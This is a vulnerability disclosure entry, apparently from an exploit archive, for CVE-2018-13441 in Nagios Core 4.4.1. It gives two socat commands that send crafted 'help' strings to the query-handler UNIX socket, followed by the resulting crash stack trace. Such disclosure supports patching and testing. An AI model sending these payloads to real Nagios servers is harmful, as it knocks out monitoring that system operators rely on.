Exploit Title: Nagios Core qh_help Denial of Service<br>
Date: 2018-07-09<br>
Exploit Author: Fakhri Zulkifli (@d0lph1n98)<br>
Vendor Homepage: https://www.nagios.org/<br>
Software Link: https://www.nagios.org/downloads/nagios-core/<br>
Version: 4.4.1 and earlier<br>
Tested on: 4.4.1<br>
CVE : CVE-2018-13441<br>
<br>
qh_help in Nagios Core version 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attacker to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.<br>
<br>
$ echo -ne “#help\0" | socat unix-connect:./poc/nagios.qh -<br>
$ echo -ne “@help\0" | socat unix-connect:./poc/nagios.qh -<br>
<br>
#0 0x554fef in qh_help /home/user/nagioscore/base/query-handler.c:374:7<br>
#1 0x5543db in qh_input /home/user/nagioscore/base/query-handler.c:227:12<br>
#2 0x6fac51 in iobroker_poll /home/user/nagioscore/lib/iobroker.c:353:4<br>
#3 0x5bc334 in event_execution_loop /home/user/nagioscore/base/events.c:1136:12<br>
#4 0x53a503 in main /home/user/nagioscore/base/nagios.c:844:4<br>
#5 0x7f61587ae82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291<br>
#6 0x42b278 in _start (/home/user/nagioscore/base/nagios+0x42b278)<br>
<br>
